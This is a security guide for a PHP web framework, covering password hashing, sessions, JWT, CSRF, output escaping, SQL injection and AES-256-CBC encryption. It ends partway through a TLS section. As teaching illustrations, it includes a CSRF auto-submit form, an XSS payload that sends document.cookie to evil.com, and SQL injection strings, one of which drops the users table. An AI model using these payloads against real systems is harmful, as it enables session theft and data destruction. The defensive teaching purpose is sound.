# Comprehensive Security Guide

**SO Backend Framework** | **Master Security Documentation** | **Version 2.0**

Complete technical reference covering all security layers, threat models, attack mitigations, and implementation details for enterprise-grade protection.

---

## Table of Contents

1. [Security Architecture Overview](#security-architecture-overview)
2. [Defense-in-Depth Strategy](#defense-in-depth-strategy)
3. [Authentication Deep Dive](#authentication-deep-dive)
4. [Session Security](#session-security)
5. [API Security](#api-security)
6. [CSRF Protection](#csrf-protection)
7. [Input/Output Security](#inputoutput-security)
8. [Encryption](#encryption)
9. [Security Headers](#security-headers)
10. [Rate Limiting & DoS Protection](#rate-limiting--dos-protection)
11. [Account Lockout & Brute Force Protection](#account-lockout--brute-force-protection)
12. [Threat Models & OWASP Top 10](#threat-models--owasp-top-10)
13. [Security Configuration](#security-configuration)
14. [Best Practices](#best-practices)
15. [Security Checklist](#security-checklist)

---

## Security Architecture Overview

### Layered Security Model

The SO Framework implements a defense-in-depth security architecture with multiple independent security layers:

```
Client Request
    │
    ▼
┌───────────────────────────┐
│ HTTPS/TLS & Security Headers │  ← Encryption in transit
└─────────┬─────────────────┘
          │
          ▼
┌───────────────────────────┐
│ Rate Limiting & DoS       │  ← IP/User-based throttling
└─────────┬─────────────────┘
          │
          ▼
┌───────────────────────────┐
│ CSRF / JWT Validation     │  ← Token verification
└─────────┬─────────────────┘
          │
          ▼
┌───────────────────────────┐
│ Authentication & Lockout  │  ← Session/JWT verification
└─────────┬─────────────────┘
          │
          ▼
┌───────────────────────────┐
│ Authorization & Context   │  ← Role/permission checks
└─────────┬─────────────────┘
          │
          ▼
┌───────────────────────────┐
│ Input Validation & XSS    │  ← Type checking, sanitization
└─────────┬─────────────────┘
          │
          ▼
┌───────────────────────────┐
│ Application & Database    │  ← Business logic, encrypted data
└───────────────────────────┘
```

### Security Components

| Component | Location | Purpose |
|-----------|----------|---------|
| **Encrypter** | `core/Security/Encrypter.php` | AES-256-CBC encryption |
| **JWT** | `core/Security/JWT.php` | Token generation/validation |
| **CSRF** | `core/Security/Csrf.php` | Cross-site request forgery protection |
| **RateLimiter** | `core/Security/RateLimiter.php` | Request throttling |
| **Sanitizer** | `core/Security/Sanitizer.php` | Input/output sanitization |
| **Auth** | `core/Auth/Auth.php` | Authentication service |
| **LoginThrottle** | `core/Auth/LoginThrottle.php` | Login attempt tracking |
| **JwtBlacklist** | `core/Security/JwtBlacklist.php` | Token revocation |

### Related Documentation

- [DEV-SECURITY.md](/docs/md/DEV-SECURITY.md) - CSRF, Rate Limiting, CORS
- [SECURITY-LAYER.md](/docs/md/SECURITY-LAYER.md) - Security layer overview
- [AUTH-SYSTEM.md](/docs/md/AUTH-SYSTEM.md) - Authentication system
- [SESSION-SYSTEM.md](/docs/md/SESSION-SYSTEM.md) - Session management
- [SESSION-ENCRYPTION.md](/docs/md/SESSION-ENCRYPTION.md) - Session payload encryption
- [AUTH-LOCKOUT.md](/docs/md/AUTH-LOCKOUT.md) - Account lockout system
- [DEV-API-AUTH.md](/docs/md/DEV-API-AUTH.md) - API authentication
- [ENCRYPTER.md](/docs/md/ENCRYPTER.md) - Encryption utilities
- [PASSWORD-RESET.md](/docs/md/PASSWORD-RESET.md) - Password reset flow

---

## Defense-in-Depth Strategy

### Multiple Independent Layers

Each security layer operates independently. If one layer is bypassed, others remain effective:

**Layer 1: Network Security**
- HTTPS/TLS encryption (data in transit)
- Security headers (CSP, HSTS, X-Frame-Options)
- CORS policies (cross-origin restrictions)

**Layer 2: Access Control**
- Rate limiting (IP and user-based)
- Account lockout (brute force prevention)
- IP whitelisting (for admin/internal APIs)

**Layer 3: Request Validation**
- CSRF tokens (web requests)
- JWT signatures (API requests)
- Request signature validation (internal APIs)

**Layer 4: Authentication**
- Password hashing (Argon2ID/bcrypt)
- Session management
- Remember me tokens
- Multi-factor authentication ready

**Layer 5: Authorization**
- Role-based access control (RBAC)
- Context-aware permissions
- Resource ownership validation

**Layer 6: Data Security**
- Input validation and sanitization
- Output encoding (XSS prevention)
- SQL injection prevention (parameterized queries)
- Encryption at rest (AES-256-CBC)

### Security Principles

**1. Least Privilege**
- Users/services granted minimum necessary permissions
- Default deny (explicit allow required)
- Temporary privilege elevation when needed

**2. Fail Securely**
- Errors don't expose sensitive information
- Failed authentication returns generic messages
- Exceptions logged without revealing system details

**3. Zero Trust**
- Never trust user input
- Validate all data from external sources
- Verify on every request (no implicit trust)

**4. Security by Default**
- Secure configurations out-of-the-box
- Insecure features disabled by default
- Opt-in for less secure options

---

## Authentication Deep Dive

### Password Security

#### Password Hashing

**Algorithm**: Argon2ID (preferred) or bcrypt (fallback)

```php
// User.php - Password hashing mutator
protected function setPasswordAttribute(string $value): void
{
    // Argon2ID hashing (memory-hard, GPU-resistant)
    $this->attributes['password'] = password_hash($value, PASSWORD_ARGON2ID, [
        'memory_cost' => 65536,  // 64 MB
        'time_cost'   => 4,      // 4 iterations
        'threads'     => 2,      // 2 parallel threads
    ]);
}

// Verify password
public function verifyPassword(string $password): bool
{
    return password_verify($password, $this->password);
}
```

**Why Argon2ID?**
- Winner of Password Hashing Competition (2015)
- Memory-hard (resistant to GPU/ASIC attacks)
- Side-channel resistant
- Configurable memory, time, and parallelism

**Parameters Explained**:
- `memory_cost`: 64 MB per hash (makes brute force expensive)
- `time_cost`: 4 iterations (computational work)
- `threads`: 2 parallel threads (utilize multi-core CPUs)

#### Login Flow

```
User Submits Credentials
    │
    ▼
┌──────────────────────┐
│ Rate Limit Check     │  ← IP/email-based limits
└─────────┬────────────┘
          │
          ▼
┌──────────────────────┐
│ Retrieve User        │  ← Query database by email
└─────────┬────────────┘
          │
          ▼
┌──────────────────────┐
│ Verify Password      │  ← Timing-safe comparison
└─────────┬────────────┘
          │
          ▼
┌──────────────────────┐
│ Clear Rate Limit     │  ← Reset counters
│ Regenerate CSRF      │  ← Prevent session fixation
│ Create Session       │  ← Store user ID
└─────────┬────────────┘
          │
          ▼
┌──────────────────────┐
│ Remember Me Token    │  ← Optional secure token
└─────────┬────────────┘
          │
          ▼
    Login Success
```

**Implementation**:

```php
// AuthController.php
public function login(Request $request): Response
{
    // 1. Rate limiting
    $rateLimiter = app('rate.limiter');
    $key = 'login:' . $request->ip();

    if ($rateLimiter->tooManyAttempts($key, 5, 60)) {
        return JsonResponse::error('Too many login attempts. Please try again in 1 minute.', 429);
    }

    // 2. Validate input
    $credentials = validate($request->all(), [
        'email' => 'required|email',
        'password' => 'required|min:8',
    ]);

    // 3. Attempt authentication
    if (!auth()->attempt($credentials, $request->input('remember', false))) {
        // Increment failed attempts
        $rateLimiter->hit($key, 1);

        // Generic error message (don't reveal if email exists)
        return JsonResponse::error('Invalid credentials', 401);
    }

    // 4. Clear rate limit on success
    $rateLimiter->clear($key);

    // 5. Regenerate session (prevent session fixation)
    session()->regenerate();

    // 6. Regenerate CSRF token
    Csrf::regenerate();

    // 7. Log successful login
    activity()
        ->causedBy(auth()->user())
        ->withProperties(['ip' => $request->ip()])
        ->log('User logged in')
        ->save();

    return redirect('/dashboard');
}
```

#### Remember Me Functionality

**How It Works**:

1. User checks "Remember Me" on login
2. Generate secure random token (64 characters)
3. Hash token and store in `users.remember_token`
4. Set HTTP-only cookie with plaintext token (30-day expiration)
5. On future visits, validate cookie token against hashed database value

**Implementation**:

```php
// Auth.php
public function attemptRememberMe(): bool
{
    $token = $_COOKIE['remember_token'] ?? null;

    if (!$token) {
        return false;
    }

    // Find user with matching hashed token
    $user = User::where('remember_token', hash('sha256', $token))->first();

    if (!$user) {
        // Invalid token - clear cookie
        setcookie('remember_token', '', time() - 3600, '/', '', true, true);
        return false;
    }

    // Log user in
    $this->login($user);

    // Regenerate token (one-time use)
    $newToken = bin2hex(random_bytes(32));
    $user->update(['remember_token' => hash('sha256', $newToken)]);

    // Set new cookie
    setcookie('remember_token', $newToken, time() + (86400 * 30), '/', '', true, true);

    return true;
}
```

**Security Considerations**:

- Tokens are hashed before storage (database breach doesn't expose valid tokens)
- HTTP-only flag (JavaScript can't access)
- Secure flag (HTTPS only in production)
- One-time use (token regenerated on each use)
- 30-day expiration (balance security vs. convenience)

### Account Lockout System

Prevents brute force attacks by temporarily locking accounts after failed login attempts.

**Features**:
- IP + Email combination tracking
- Configurable max attempts and lockout duration
- Automatic expiry
- Successful login clears lockout

**Implementation**: See [AUTH-LOCKOUT.md](/docs/md/AUTH-LOCKOUT.md)

**Configuration**:

```env
# .env
AUTH_THROTTLE_ENABLED=true
AUTH_THROTTLE_MAX_ATTEMPTS=5
AUTH_THROTTLE_DECAY_MINUTES=15
```

**Flow**:

```
Login Attempt
    │
    ▼
┌──────────────────────┐
│ Generate Key         │  ← sha1(ip|email)
└─────────┬────────────┘
          │
          ▼
┌──────────────────────┐
│ Check Attempts       │  ← cache->get(key)
└─────────┬────────────┘
          │
          ▼
┌──────────────────────┐
│ Verify Credentials   │  ← Check password
└─────────┬────────────┘
          │
          ▼
┌──────────────────────┐
│ Clear/Increment      │  ← Success or fail
└──────────────────────┘
```

---

## Session Security

### Session Storage

**Driver**: Database (for horizontal scaling)

**Table Schema**:

```sql
CREATE TABLE sessions (
    id VARCHAR(255) PRIMARY KEY,
    user_id BIGINT UNSIGNED,
    ip_address VARCHAR(45),
    user_agent TEXT,
    payload LONGTEXT NOT NULL,
    last_activity INT UNSIGNED NOT NULL,
    INDEX idx_user_id (user_id),
    INDEX idx_last_activity (last_activity)
);
```

### Session Encryption (AES-256-CBC)

**Why Encrypt Sessions?**
- Protects sensitive data at rest
- Compliance requirements (GDPR, HIPAA, PCI DSS)
- Defense against database breaches
- Tamper detection via HMAC

**Encryption Process**:

```
Session Data (plaintext)
    │
    ▼
┌──────────────────────┐
│ Serialize (PHP)      │  ← Convert to string
└─────────┬────────────┘
          │
          ▼
┌──────────────────────┐
│ Generate Random IV   │  ← 16 bytes
└─────────┬────────────┘
          │
          ▼
┌──────────────────────┐
│ AES-256-CBC Encrypt  │  ← key + IV
└─────────┬────────────┘
          │
          ▼
┌──────────────────────┐
│ Compute HMAC-SHA256  │  ← Tamper detection
└─────────┬────────────┘
          │
          ▼
┌──────────────────────┐
│ JSON Envelope        │  ← {iv, value, mac}
└─────────┬────────────┘
          │
          ▼
┌──────────────────────┐
│ Base64 Encode        │  ← Safe for storage
└─────────┬────────────┘
          │
          ▼
  Store in Database
```

**Implementation**: See [SESSION-ENCRYPTION.md](/docs/md/SESSION-ENCRYPTION.md)

**Configuration**:

```env
# .env
SESSION_ENCRYPT=true
APP_KEY=base64:YourBase64EncodedKeyHere==
```

### Session Hijacking Prevention

**Threats**:
1. Session fixation (attacker sets session ID)
2. Session sidejacking (attacker steals session cookie)
3. Cross-site scripting (XSS steals cookie via JavaScript)

**Mitigations**:

**1. Session Regeneration**

```php
// After login
session()->regenerate();

// After privilege escalation
session()->regenerate();

// Periodically (every 15 minutes)
if (time() - session()->get('last_regeneration', 0) > 900) {
    session()->regenerate(false); // Keep old session data
    session()->put('last_regeneration', time());
}
```

**2. Cookie Security Flags**

```php
// config/session.php
return [
    'cookie' => env('SESSION_COOKIE', 'so_session'),
    'secure' => env('SESSION_SECURE', true),    // HTTPS only
    'http_only' => true,                        // No JavaScript access
    'same_site' => 'lax',                       // CSRF protection
    'lifetime' => 120,                          // 2 hours
];
```

**3. User-Agent Validation (Optional)**

```php
// Store on login
session()->put('user_agent', $request->userAgent());

// Validate on each request
if (session()->get('user_agent') !== $request->userAgent()) {
    // Suspicious activity
    session()->flush();
    return redirect('/login')->with('error', 'Session invalidated');
}
```

**4. IP Address Validation (Strict, Optional)**

```php
// Store on login
session()->put('ip_address', $request->ip());

// Validate on each request
if (session()->get('ip_address') !== $request->ip()) {
    // Log and invalidate
    logger()->warning('IP address mismatch', [
        'user_id' => auth()->id(),
        'session_ip' => session()->get('ip_address'),
        'request_ip' => $request->ip(),
    ]);

    session()->flush();
    return redirect('/login')->with('error', 'Session invalidated');
}
```

**Warning**: IP validation may cause issues with:
- Mobile users switching between WiFi and cellular
- Users behind load balancers
- VPN users

### Session Fixation Prevention

**Attack Scenario**:

```
1. Attacker gets session ID: SESS123
2. Attacker tricks victim into using SESS123
3. Victim logs in (session SESS123 now authenticated)
4. Attacker uses SESS123 to access victim's account
```

**Prevention**:

```php
// ALWAYS regenerate session ID after login
public function login(Request $request): Response
{
    $credentials = $request->only(['email', 'password']);

    if (auth()->attempt($credentials)) {
        // Regenerate session ID (new ID, keep data)
        session()->regenerate();

        // New session ID issued to user
        // Attacker's old session ID is now invalid

        return redirect('/dashboard');
    }

    return back()->with('error', 'Invalid credentials');
}
```

---

## API Security

### JWT Token Authentication

**JSON Web Token Structure**:

```
header.payload.signature

Example:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VyX2lkIjoxMjMsImV4cCI6MTcwNjc0NTYwMH0.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Decoded**:

```json
{
  "header": {
    "alg": "HS256",
    "typ": "JWT"
  },
  "payload": {
    "user_id": 123,
    "email": "user@example.com",
    "iat": 1706742000,
    "exp": 1706745600,
    "jti": "a1b2c3d4e5f6"
  },
  "signature": "..."
}
```

#### Token Generation

```php
// JWT.php - encode() method
public function encode(array $payload, ?int $ttl = null): string
{
    // Add standard claims
    $payload['iat'] = time();                     // Issued at
    $payload['jti'] = bin2hex(random_bytes(16));  // JWT ID (unique)

    if ($ttl !== null) {
        $payload['exp'] = time() + $ttl;          // Expiration
    }

    // Build header
    $header = [
        'typ' => 'JWT',
        'alg' => 'HS256'
    ];

    // Encode header and payload
    $segments = [
        $this->base64UrlEncode(json_encode($header)),
        $this->base64UrlEncode(json_encode($payload))
    ];

    // Sign with HMAC-SHA256
    $signature = $this->sign(implode('.', $segments));
    $segments[] = $signature;

    return implode('.', $segments);
}

protected function sign(string $message): string
{
    // HMAC-SHA256 signature
    $hash = hash_hmac('sha256', $message, $this->secret, true);
    return $this->base64UrlEncode($hash);
}
```

#### Token Validation

```php
// JWT.php - decode() method
public function decode(string $token): array
{
    $segments = explode('.', $token);

    if (count($segments) !== 3) {
        throw new \Exception('Invalid token format');
    }

    [$headerEncoded, $payloadEncoded, $signature] = $segments;

    // 1. Verify signature (timing-safe comparison)
    $expected = $this->sign($headerEncoded . '.' . $payloadEncoded);
    if (!hash_equals($expected, $signature)) {
        throw new \Exception('Invalid signature');
    }

    // 2. Decode payload
    $payload = json_decode($this->base64UrlDecode($payloadEncoded), true);

    // 3. Check expiration
    if (isset($payload['exp']) && $payload['exp'] < time()) {
        throw new \Exception('Token expired');
    }

    // 4. Check blacklist (individual token revocation)
    if ($this->blacklist && isset($payload['jti'])) {
        if ($this->blacklist->isBlacklisted($payload['jti'])) {
            throw new \Exception('Token has been revoked');
        }
    }

    // 5. Check user-level invalidation
    if ($this->blacklist && isset($payload['sub'], $payload['iat'])) {
        if ($this->blacklist->isUserInvalidated($payload['sub'], $payload['iat'])) {
            throw new \Exception('Token has been revoked (user invalidated)');
        }
    }

    return $payload;
}
```

#### Token Blacklisting

**Use Cases**:
- Logout (revoke specific token)
- Password change (revoke all user tokens)
- Account compromise (revoke all user tokens)
- Permission changes (revoke all user tokens)

**Implementation**:

```php
// JwtBlacklist.php
class JwtBlacklist
{
    protected CacheManager $cache;

    // Blacklist individual token (by JWT ID)
    public function add(string $jti, int $expiresAt): void
    {
        $key = "jwt_blacklist:{$jti}";
        $ttl = max(0, $expiresAt - time());

        $this->cache->put($key, true, $ttl);
    }

    // Check if token is blacklisted
    public function isBlacklisted(string $jti): bool
    {
        return $this->cache->has("jwt_blacklist:{$jti}");
    }

    // Invalidate all tokens for user
    public function invalidateUser(int $userId): void
    {
        $key = "jwt_user_invalidated:{$userId}";
        $this->cache->put($key, time(), 86400 * 30); // 30 days
    }

    // Check if user tokens are invalidated
    public function isUserInvalidated(int $userId, int $tokenIssuedAt): bool
    {
        $invalidatedAt = $this->cache->get("jwt_user_invalidated:{$userId}");

        if ($invalidatedAt === null) {
            return false;
        }

        // Token issued before invalidation timestamp
        return $tokenIssuedAt < $invalidatedAt;
    }
}
```

**Usage**:

```php
// Logout (revoke specific token)
public function logout(Request $request): JsonResponse
{
    $token = $request->bearerToken();
    jwt()->invalidate($token);

    return JsonResponse::success(['message' => 'Logged out successfully']);
}

// Password change (revoke all user tokens)
public function changePassword(Request $request): JsonResponse
{
    $user = $request->user();

    // Update password
    $user->update(['password' => $newPassword]);

    // Revoke ALL user tokens
    jwt()->invalidateUser($user->id);

    // Generate new token
    $newToken = jwt()->encode(['user_id' => $user->id], 3600);

    return JsonResponse::success([
        'message' => 'Password changed. All devices logged out.',
        'token' => $newToken,
    ]);
}
```

#### JWT Security Best Practices

**1. Strong Secret Keys**

```bash
# Minimum 32 characters (256 bits)
JWT_SECRET=$(openssl rand -base64 32)
```

**2. Short Expiration Times**

```php
// Short-lived access tokens (15-60 minutes)
$accessToken = jwt()->encode($payload, 900);  // 15 minutes

// Long-lived refresh tokens (7-30 days)
$refreshToken = jwt()->encode(['type' => 'refresh'], 86400 * 7);
```

**3. Don't Store Sensitive Data**

```php
// BAD - sensitive data in token
$token = jwt()->encode([
    'user_id' => 123,
    'password' => $user->password,        // NEVER!
    'credit_card' => $user->card_number,  // NEVER!
    'ssn' => $user->ssn,                  // NEVER!
], 3600);

// GOOD - only identifiers and non-sensitive data
$token = jwt()->encode([
    'user_id' => 123,
    'email' => $user->email,
    'role' => $user->role,
], 3600);
```

**4. HTTPS Only**

```env
# Production
APP_ENV=production
APP_URL=https://yourdomain.com
```

**5. Implement Token Refresh**

```php
// Refresh token endpoint
public function refresh(Request $request): JsonResponse
{
    $currentUser = $request->user(); // From middleware

    $newToken = jwt()->encode([
        'user_id' => $currentUser['user_id'],
        'email' => $currentUser['email'],
    ], 3600);

    return JsonResponse::success([
        'token' => $newToken,
        'expires_in' => 3600,
    ]);
}
```

### API Request Signature Authentication

For internal/cron/service-to-service communication.

**How It Works**:

1. Client computes HMAC-SHA256 signature of request
2. Signature includes: method + URI + timestamp + body
3. Server recomputes signature and compares

**Implementation**:

```php
// Generate signature
function signRequest(string $method, string $uri, string $body, string $secret): string
{
    $timestamp = time();
    $message = "{$method}|{$uri}|{$timestamp}|{$body}";
    $signature = hash_hmac('sha256', $message, $secret);

    return base64_encode("{$timestamp}:{$signature}");
}

// Verify signature
function verifyRequest(Request $request, string $secret): bool
{
    $signatureHeader = $request->header('X-Signature');

    if (!$signatureHeader) {
        return false;
    }

    $decoded = base64_decode($signatureHeader);
    [$timestamp, $signature] = explode(':', $decoded);

    // Check timestamp (prevent replay attacks)
    if (abs(time() - $timestamp) > 300) {  // 5 minute window
        return false;
    }

    // Recompute signature
    $message = $request->method() . '|' . $request->uri() . '|' . $timestamp . '|' . $request->body();
    $expected = hash_hmac('sha256', $message, $secret);

    return hash_equals($expected, $signature);
}
```

---

## CSRF Protection

### How CSRF Attacks Work

**Attack Scenario**:

```html
<!-- Malicious site: evil.com -->
<img src="https://yourdomain.com/account/delete?confirm=yes">

<!-- OR -->
<form action="https://yourdomain.com/account/transfer" method="POST">
    <input type="hidden" name="to" value="attacker@evil.com">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

If user is logged in to `yourdomain.com`, their session cookie is sent automatically, and the action executes!

### CSRF Protection Implementation

**Token Generation**:

```php
// Csrf.php
class Csrf
{
    protected static ?string $token = null;

    public static function token(): string
    {
        if (self::$token === null) {
            self::$token = session()->get('_csrf_token');

            if (!self::$token) {
                // Generate cryptographically secure random token
                self::$token = bin2hex(random_bytes(32));  // 64 hex chars
                session()->set('_csrf_token', self::$token);
            }
        }

        return self::$token;
    }

    public static function verify(string $token): bool
    {
        $expected = self::token();

        // Timing-safe comparison (prevents timing attacks)
        return hash_equals($expected, $token);
    }

    public static function regenerate(): string
    {
        self::$token = bin2hex(random_bytes(32));
        session()->set('_csrf_token', self::$token);

        return self::$token;
    }
}
```

**Middleware Validation**:

```php
// CsrfMiddleware.php
class CsrfMiddleware implements MiddlewareInterface
{
    public function handle(Request $request, Closure $next): Response
    {
        // Skip safe methods (read-only operations)
        if (in_array($request->method(), ['GET', 'HEAD', 'OPTIONS'])) {
            return $next($request);
        }

        // Skip excluded routes (API, webhooks)
        if (Csrf::isExcluded($request->path())) {
            return $next($request);
        }

        // Extract token from request
        $token = $request->input('_token')           // POST field
              ?? $request->header('X-CSRF-TOKEN');   // HTTP header

        // Verify token
        if (!$token || !Csrf::verify($token)) {
            // JSON request
            if ($request->expectsJson()) {
                return JsonResponse::error('CSRF token mismatch', 419);
            }

            // Web request
            return redirect()->back()->with('error', 'CSRF token mismatch');
        }

        return $next($request);
    }
}
```

**HTML Form Usage**:

```php
<form method="POST" action="/users">
    <?= csrf_field() ?>  <!-- Generates hidden input -->

    <input type="text" name="name">
    <button type="submit">Create User</button>
</form>

<!-- Rendered HTML: -->
<!-- <input type="hidden" name="_token" value="a3f5c9...64-hex-chars..."> -->
```

**AJAX Usage**:

```javascript
// Store token in meta tag
<meta name="csrf-token" content="<?= csrf_token() ?>">

// Send via header
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

fetch('/api/users', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-TOKEN': csrfToken,
    },
    body: JSON.stringify({ name: 'Jane' }),
});
```

**SameSite Cookie Strategy**:

```php
// config/session.php
return [
    'same_site' => 'lax',  // or 'strict'
];
```

**SameSite Values**:

- `strict`: Cookie never sent on cross-site requests (most secure, may break workflows)
- `lax`: Cookie sent on top-level navigation (GET), not on embedded requests (balanced)
- `none`: Cookie always sent (requires `secure` flag, least secure)

---

## Input/Output Security

### XSS Prevention

**Cross-Site Scripting (XSS)** occurs when malicious scripts are injected into web pages.

**Types of XSS**:

1. **Reflected XSS**: Malicious script in URL parameter

```
https://example.com/search?q=<script>alert(document.cookie)</script>
```

2. **Stored XSS**: Malicious script stored in database

```php
$comment->body = '<script>steal_session()</script>';
```

3. **DOM-based XSS**: Client-side JavaScript manipulates DOM unsafely

```javascript
element.innerHTML = location.hash;  // DANGEROUS
```

#### Output Escaping

**Always escape user-generated content**:

```php
// Sanitizer.php
class Sanitizer
{
    public static function escape(string $value): string
    {
        return htmlspecialchars($value, ENT_QUOTES, 'UTF-8', false);
    }
}

// Helper function
function e(string $value): string
{
    return Sanitizer::escape($value);
}
```

**Usage**:

```php
<!-- VULNERABLE (NEVER do this) -->
<h1>Welcome, <?= $userName ?></h1>

<!-- SAFE (ALWAYS do this) -->
<h1>Welcome, <?= e($userName) ?></h1>
```

**Character Conversion**:

| Character | Escaped To | Why |
|-----------|-----------|-----|
| `<` | `&lt;` | Prevents opening HTML tags |
| `>` | `&gt;` | Prevents closing HTML tags |
| `&` | `&amp;` | Prevents entity injection |
| `"` | `&quot;` | Prevents breaking attributes |
| `'` | `&#039;` | Prevents breaking attributes |

**Example Attack**:

```php
// User input
$userName = '<script>fetch("https://evil.com?cookie=" + document.cookie)</script>';

// Without escaping
echo "<h1>Welcome, {$userName}</h1>";
// Result: Script executes, steals session cookie

// With escaping
echo "<h1>Welcome, " . e($userName) . "</h1>";
// Result: Literal text displayed: <script>fetch...</script>
```

#### Context-Specific Escaping

**HTML Context**:

```php
<div class="user-<?= e($userRole) ?>">
<img src="<?= e($imageUrl) ?>" alt="<?= e($imageAlt) ?>">
```

**JavaScript Context**:

```php
<script>
    // Use json_encode() for JS variables
    const userName = <?= json_encode($user->name) ?>;
    const userData = <?= json_encode($user->toArray()) ?>;
</script>
```

**URL Context**:

```php
<a href="/search?q=<?= urlencode($searchTerm) ?>">Search</a>
```

**CSS Context** (avoid if possible):

```php
<style>
    .user-color {
        /* Validate color format before outputting */
        color: <?= preg_match('/^#[0-9A-Fa-f]{6}$/', $color) ? $color : '#000000' ?>;
    }
</style>
```

#### Content Security Policy (CSP)

```php
// Add CSP header to block inline scripts
$response->header('Content-Security-Policy',
    "default-src 'self'; " .
    "script-src 'self' https://cdn.example.com; " .
    "style-src 'self' 'unsafe-inline'; " .
    "img-src 'self' data: https:; " .
    "font-src 'self' data:;"
);
```

### SQL Injection Prevention

**SQL Injection** occurs when user input is concatenated into SQL queries.

**Attack Example**:

```php
// VULNERABLE (NEVER do this)
$email = $_POST['email'];
$sql = "SELECT * FROM users WHERE email = '{$email}'";
$result = $db->query($sql);

// Attacker input: admin@example.com' OR '1'='1
// Resulting query: SELECT * FROM users WHERE email = 'admin@example.com' OR '1'='1'
// Result: Returns ALL users
```

#### Always Use Parameterized Queries

**Query Builder (Safe)**:

```php
use Core\Database\DB;

// WHERE clause with bindings
$users = DB::table('users')
    ->where('email', $request->input('email'))
    ->get();

// Multiple conditions
$posts = DB::table('posts')
    ->where('user_id', $userId)
    ->where('status', $status)
    ->get();
```

**Model (Safe)**:

```php
use App\Models\User;

// Find by primary key
$user = User::find($request->input('id'));

// Find by attribute
$user = User::findBy('email', $request->input('email'));

// Where queries
$users = User::where('role', $request->input('role'))->get();
```

**Raw Query with Bindings (Safe)**:

```php
// Positional placeholders
$result = app('db')->connection->query(
    "SELECT * FROM users WHERE email = ? AND status = ?",
    [$email, 'active']
);

// Named placeholders
$result = app('db')->connection->query(
    "SELECT * FROM users WHERE email = :email AND status = :status",
    ['email' => $email, 'status' => 'active']
);
```

#### Column/Table Name Validation

**Problem**: Query builders only protect VALUES, not column/table names.

```php
// VULNERABLE - user controls column name
$column = $request->input('sort_by');  // Could be: "id; DROP TABLE users--"
$users = DB::table('users')->orderBy($column)->get();
```

**Solution: Whitelist allowed columns**:

```php
$sortBy = $request->input('sort_by', 'created_at');
$allowedColumns = ['name', 'email', 'created_at', 'status'];

if (!in_array($sortBy, $allowedColumns)) {
    $sortBy = 'created_at';  // Default
}

$users = DB::table('users')->orderBy($sortBy)->get();
```

#### LIKE Query Sanitization

```php
$search = $request->input('search');

// Escape LIKE wildcards (%, _)
$escapedSearch = str_replace(['%', '_'], ['\%', '\_'], $search);

$users = DB::table('users')
    ->where('name', 'LIKE', "%{$escapedSearch}%")
    ->get();
```

#### Validation Before Queries

```php
use Core\Validation\Validator;

// Validate input types
$validator = Validator::make($request->all(), [
    'id'     => 'required|integer',
    'email'  => 'required|email',
    'role'   => 'required|in:admin,user,moderator',
]);

if ($validator->fails()) {
    return redirect()->back()->withErrors($validator->errors());
}

// Now safe to query
$user = User::find($request->input('id'));
```

---

## Encryption

### AES-256-CBC Encryption

**Use Cases**:
- Session payload encryption
- Storing API credentials in database
- Encrypting sensitive user data (SSN, credit cards)
- File encryption at rest

**Implementation**: See [ENCRYPTER.md](/docs/md/ENCRYPTER.md)

#### Encryption Process

```
Plaintext
    │
    ▼
┌──────────────────────┐
│ Generate Random IV   │  ← 16 bytes
└─────────┬────────────┘
          │
          ▼
┌──────────────────────┐
│ AES-256-CBC Encrypt  │  ← key + IV
└─────────┬────────────┘
          │
          ▼
┌──────────────────────┐
│ Compute HMAC-SHA256  │  ← Integrity check
└─────────┬────────────┘
          │
          ▼
┌──────────────────────┐
│ JSON Envelope        │  ← {iv, value, mac}
└─────────┬────────────┘
          │
          ▼
┌──────────────────────┐
│ Base64 Encode        │  ← Safe string
└─────────┬────────────┘
          │
          ▼
Encrypted String (safe for storage)
```

**Code**:

```php
// Encrypter.php
class Encrypter
{
    protected const CIPHER = 'aes-256-cbc';
    protected const HMAC_ALGO = 'sha256';
    protected const KEY_LENGTH = 32;

    protected string $key;

    public function __construct(string $key)
    {
        // Decode base64-encoded key
        if (str_starts_with($key, 'base64:')) {
            $key = base64_decode(substr($key, 7));
        }

        if (strlen($key) < self::KEY_LENGTH) {
            throw new \Exception('Key too short (minimum 32 bytes)');
        }

        $this->key = substr($key, 0, self::KEY_LENGTH);
    }

    public function encrypt(string $data): string
    {
        // Generate random IV
        $iv = random_bytes(openssl_cipher_iv_length(self::CIPHER));

        // Encrypt
        $ciphertext = openssl_encrypt(
            $data,
            self::CIPHER,
            $this->key,
            OPENSSL_RAW_DATA,
            $iv
        );

        // Base64-encode IV and ciphertext
        $ivBase64 = base64_encode($iv);
        $valueBase64 = base64_encode($ciphertext);

        // Compute HMAC (Encrypt-then-MAC)
        $mac = hash_hmac(self::HMAC_ALGO, $ivBase64 . $valueBase64, $this->key);

        // Build JSON envelope
        $payload = json_encode([
            'iv'    => $ivBase64,
            'value' => $valueBase64,
            'mac'   => $mac,
        ]);

        return base64_encode($payload);
    }

    public function decrypt(string $encrypted): string
    {
        // Decode outer base64
        $jsonPayload = base64_decode($encrypted, true);
        $payload = json_decode($jsonPayload, true);

        // Verify HMAC
        $expectedMac = hash_hmac(
            self::HMAC_ALGO,
            $payload['iv'] . $payload['value'],
            $this->key
        );

        if (!hash_equals($expectedMac, $payload['mac'])) {
            throw new \Exception('MAC verification failed (data tampered)');
        }

        // Decrypt
        $plaintext = openssl_decrypt(
            base64_decode($payload['value']),
            self::CIPHER,
            $this->key,
            OPENSSL_RAW_DATA,
            base64_decode($payload['iv'])
        );

        if ($plaintext === false) {
            throw new \Exception('Decryption failed');
        }

        return $plaintext;
    }
}
```

#### Key Management

**Generate Key**:

```bash
# Generate 32-byte key
php -r "echo 'APP_KEY=base64:' . base64_encode(random_bytes(32)) . PHP_EOL;"
```

**Configuration**:

```env
# .env
APP_KEY=base64:YourBase64EncodedKeyHere==
```

**Key Rotation**:

```php
// Re-encrypt with new key
$oldEncrypter = new Encrypter($oldKey);
$newEncrypter = new Encrypter($newKey);

$users = User::all();
foreach ($users as $user) {
    if ($user->ssn_encrypted) {
        $plaintext = $oldEncrypter->decrypt($user->ssn_encrypted);
        $user->ssn_encrypted = $newEncrypter->encrypt($plaintext);
        $user->save();
    }
}
```

### TLS for Data in Transit

**HTTPS Configuration**:

```env
# .env (production)
